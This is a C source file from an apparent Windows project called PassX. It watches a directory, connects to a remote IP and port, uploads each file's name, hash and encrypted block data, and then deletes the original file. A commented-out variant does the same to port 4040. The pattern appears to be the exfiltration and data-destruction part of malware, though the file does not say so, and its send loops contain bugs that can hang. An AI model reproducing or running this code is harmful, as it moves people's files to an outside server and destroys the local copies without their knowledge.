#include <Winsock2.h>
#include "PassX.h"
#include "EnumDirectoryFile.h"
#include "WatchDirectory.h"
#include "SendThread.h"
#pragma comment(lib,"Ws2_32.lib")


DWORD MonitorDir(LPVOID lpParameter)
{
	WatchDirectory(g_wMonitorPath);
	return 0;
}
BOOLEAN SendFileInformation(char *szIpAddress,PSEND_FILE_INFO pSendFileInfo)
{
	WORD wVersionRequested;
	WSADATA wsaData;
	int nErr,nSendRet;
	SOCKET sockClient;
	SOCKADDR_IN addrSrv;
	PSEND_FILE_DAT pSendDat;
	PSEND_RANDOM_BLOCK pSendRandomBlock;
	PLIST_ENTRY pCurListEntryRandomBlock;
	PRANDOM_BLOCK pCurRandomBlock;
	ULONG ulServerPort;

	if (NULL == pSendFileInfo)
	{
		return FALSE;
	}
	ulServerPort = 0;
	wVersionRequested = MAKEWORD(1,1);
	nErr = WSAStartup(wVersionRequested,&wsaData);
	if (0 != nErr)
	{
		return FALSE;
	}
	if (LOBYTE(wsaData.wVersion) != 1 || HIBYTE(wsaData.wVersion) != 1)
	{
		WSACleanup();
		return FALSE;
	}
	ulServerPort = atoi(g_ServerPort);
	sockClient = socket(AF_INET,SOCK_STREAM,0);
	memset(&addrSrv,0,sizeof(addrSrv));
	addrSrv.sin_family = AF_INET;
	addrSrv.sin_port = htons(ulServerPort);
	addrSrv.sin_addr.S_un.S_addr = inet_addr(szIpAddress);
	connect(sockClient,(SOCKADDR*)&addrSrv,sizeof(SOCKADDR));
	do 
	{
		pSendDat = (PSEND_FILE_DAT)LocalAlloc(LPTR,sizeof(SEND_FILE_DAT));
	} while (NULL == pSendDat);

	pSendDat->CmdLine.ulCommand = COMMAND_REVICE_FILE;
	pSendDat->bIsCrypt = pSendFileInfo->bIsCrypt;
	pSendDat->ulFileSize = pSendFileInfo->ulFileSize;
	pSendDat->ulRandomCount = pSendFileInfo->ulRandomCount;
	memcpy(pSendDat->FileHash,pSendFileInfo->FileHash,32);
	StringCchCopy(pSendDat->wFileName,MAX_PATH,pSendFileInfo->wFileName);
	nSendRet = send(sockClient,(const char *)pSendDat,sizeof(SEND_FILE_DAT),0);
	if (nSendRet < 0)
	{
		if (pSendDat)
		{
			LocalFree(pSendDat);
		}
		closesocket(sockClient);
		return FALSE;
	}
	do 
	{
		pSendRandomBlock = (PSEND_RANDOM_BLOCK)LocalAlloc(LPTR,sizeof(SEND_RANDOM_BLOCK));
	} while (NULL == pSendRandomBlock);
	pCurListEntryRandomBlock = pSendFileInfo->RandomBlockList.Flink;
	while (pCurListEntryRandomBlock != &pSendFileInfo->RandomBlockList)
	{
		pCurRandomBlock = CONTAINING_RECORD(pCurListEntryRandomBlock,RANDOM_BLOCK,ListRandomBlock);
		pSendRandomBlock->ulCryptDatLength = pCurRandomBlock->ulCryptDatLength;
		pSendRandomBlock->ulOffset = pCurRandomBlock->ulOffset;
		pSendRandomBlock->ulIndex = pCurRandomBlock->ulIndex;
		nSendRet = send(sockClient,(const char *)pSendRandomBlock,sizeof(SEND_RANDOM_BLOCK),0);
		if (nSendRet < 0)
		{
			continue;
		}
		nSendRet = send(sockClient,(const char *)pCurRandomBlock->pCryptDat, \
			pCurRandomBlock->ulCryptDatLength,0);
		if (nSendRet < 0)
		{
			continue;
		}
		pCurListEntryRandomBlock = pCurListEntryRandomBlock->Flink;
	}
	if (pSendRandomBlock)
	{
		LocalFree(pSendRandomBlock);
	}
	pSendDat->CmdLine.ulCommand = COMMAND_COMPLETE;
	nSendRet = send(sockClient,(const char *)pSendDat,sizeof(SEND_FILE_DAT),0);
	if (nSendRet < 0)
	{
		return 0;
	}
	closesocket(sockClient);
	WSACleanup();
	if (pSendDat)
	{
		LocalFree(pSendDat);
	}
	DeleteFile(pSendFileInfo->wFileFullPath);
	return TRUE;
}
/*DWORD WINAPI SendThread(LPVOID lpParameter)
{
	PSEND_FILE_INFO pCurEnumFieInfo;
	PLIST_ENTRY pCurListEntry,pCurListEntryRandomBlock;
	PSEND_RANDOM_BLOCK pSendRandomBlock;
	PRANDOM_BLOCK pCurRandomBlock;
	PSEND_FILE_DAT pSendDat;
	WORD wVersionRequested;
	WSADATA wsaData;
	int nErr,nSendRet;
	char szIpAddress[32];
	if (NULL == lpParameter)
	{
		return  -1;
	}
	StringCchCopyA(szIpAddress,32,(STRSAFE_LPCSTR)lpParameter);
	//szIpAddress = (char *)lpParameter;
	wVersionRequested = MAKEWORD(1,1);
	nErr = WSAStartup(wVersionRequested,&wsaData);
	if (0 != nErr)
	{
		return -1;
	}
	if (LOBYTE(wsaData.wVersion) != 1 || HIBYTE(wsaData.wVersion) != 1)
	{
		WSACleanup();
		return -1;
	}
	g_sockClient = socket(AF_INET,SOCK_STREAM,0);
	memset(&g_addrSrv,0,sizeof(g_addrSrv));
	g_addrSrv.sin_family = AF_INET;
	g_addrSrv.sin_port = htons(4040);
	g_addrSrv.sin_addr.S_un.S_addr = inet_addr(szIpAddress);
	while (TRUE)
	{
		//WaitForSingleObject(g_hEventFindInfinite,INFINITE);
		if (!IsListEmpty(&g_SendFileList))
		{
			connect(g_sockClient,(SOCKADDR*)&g_addrSrv,sizeof(SOCKADDR));
			pCurListEntry = g_SendFileList.Flink;
			while (pCurListEntry != &g_SendFileList)
			{
				pCurEnumFieInfo = (PSEND_FILE_INFO)pCurListEntry;
				if (pCurEnumFieInfo->bIsInitialize && pCurEnumFieInfo->bIsDel == FALSE && \
					pCurEnumFieInfo->bIsSend == FALSE)
				{
					do 
					{
						pSendDat = (PSEND_FILE_DAT)LocalAlloc(LPTR,sizeof(SEND_FILE_DAT));
					} while (NULL == pSendDat);
					pSendDat->CmdLine.ulCommand = COMMAND_REVICE_FILE;
					pSendDat->bIsCrypt = pCurEnumFieInfo->bIsCrypt;
					pSendDat->ulFileSize = pCurEnumFieInfo->ulFileSize;
					pSendDat->ulRandomCount = pCurEnumFieInfo->ulRandomCount;
					memcpy(pSendDat->FileHash,pCurEnumFieInfo->FileHash,32);
					StringCchCopy(pSendDat->wFileName,MAX_PATH,pCurEnumFieInfo->wFileName);
					nSendRet = send(g_sockClient,(const char *)pSendDat,sizeof(SEND_FILE_DAT),0);
					if (nSendRet < 0)
					{
						continue;
					}
					do 
					{
						pSendRandomBlock = (PSEND_RANDOM_BLOCK)LocalAlloc(LPTR,sizeof(SEND_RANDOM_BLOCK));
					} while (NULL == pSendRandomBlock);
					pCurListEntryRandomBlock = pCurEnumFieInfo->RandomBlockList.Flink;
					for (int i = 0;i < pCurEnumFieInfo->ulRandomCount;i++)
					{
						if (pCurListEntryRandomBlock != &pCurEnumFieInfo->RandomBlockList)
						{
							pCurRandomBlock = (PRANDOM_BLOCK)pCurListEntryRandomBlock;
							pSendRandomBlock->ulCryptDatLength = pCurRandomBlock->ulCryptDatLength;
							pSendRandomBlock->ulOffset = pCurRandomBlock->ulOffset;
							pSendRandomBlock->ulIndex = pCurRandomBlock->ulIndex;
							nSendRet = send(g_sockClient,(const char *)pSendRandomBlock,sizeof(SEND_RANDOM_BLOCK),0);
							if (nSendRet < 0)
							{
								continue;
							}
							nSendRet = send(g_sockClient,(const char *)pCurRandomBlock->pCryptDat, \
								pCurRandomBlock->ulCryptDatLength,0);
							if (nSendRet < 0)
							{
								continue;
							}

							pCurListEntryRandomBlock = pCurListEntryRandomBlock->Flink;
						}
					}
					//EnterCriticalSection(&g_CriticalSection);
					//RemoveEntryList(&pCurEnumFieInfo->List);
					//LeaveCriticalSection(&g_CriticalSection);
					//LocalFree(pCurEnumFieInfo);
					//LocalFree(pSendRandomBlock);
				}
				EnterCriticalSection(&g_CriticalSection);
				pCurEnumFieInfo->bIsSend = TRUE;
				LeaveCriticalSection(&g_CriticalSection);
				DeleteFile(pCurEnumFieInfo->wFileFullPath);
				pCurListEntry = pCurListEntry->Flink;
			}
			pSendDat->CmdLine.ulCommand = COMMAND_COMPLETE;
			nSendRet = send(g_sockClient,(const char *)pSendDat,sizeof(SEND_FILE_DAT),0);
			if (nSendRet < 0)
			{
				return 0;
			}
			closesocket(g_sockClient);
		}
	}
	return 0;
}
*/
DWORD DelTListMemory(LPVOID lpParameter)
{
	PSEND_FILE_INFO pSendFileInfo;
	PLIST_ENTRY pCurListEntry,pCurRandomBlock,pRemovedList;
	PRANDOM_BLOCK pRandomBlock;

	while (TRUE)
	{
		if (!IsListEmpty(&g_SendFileList))
		{
			pCurListEntry = g_SendFileList.Flink;
			while (pCurListEntry != &g_SendFileList)
			{
				pSendFileInfo = CONTAINING_RECORD(pCurListEntry,SEND_FILE_INFO,List);
				if (pSendFileInfo && pSendFileInfo->bIsSend == TRUE)
				{
					if (!IsListEmpty(&pSendFileInfo->RandomBlockList))
					{
						//pRandomBlock = (PRANDOM_BLOCK)pRecvFileInfo->RandomBlockList.Flink;
						pCurRandomBlock = pSendFileInfo->RandomBlockList.Flink;

						while (pCurRandomBlock != &pSendFileInfo->RandomBlockList)
						{
							pRandomBlock = CONTAINING_RECORD(pCurRandomBlock,RANDOM_BLOCK,ListRandomBlock);
							if (pRandomBlock)
							{
								if (pRandomBlock->pCryptDat)
								{
									LocalFree(pRandomBlock->pCryptDat);
									pRandomBlock->pCryptDat = NULL;
								}
								EnterCriticalSection(&g_CriticalSection);
								pRemovedList = RemoveHeadList((LIST_ENTRY *)pRandomBlock);
								LeaveCriticalSection(&g_CriticalSection);
								if (pRemovedList)
								{
									//LocalFree((char*)pRemovedList);
									pRemovedList = NULL;
								}
							}
							pCurRandomBlock = pCurRandomBlock->Flink;
						}
					}
					EnterCriticalSection(&g_CriticalSection);
					RemoveEntryList(&pSendFileInfo->List);
					LeaveCriticalSection(&g_CriticalSection);
				}
				pCurListEntry = pCurListEntry->Flink;
			}
		}
	}

	return 0;
}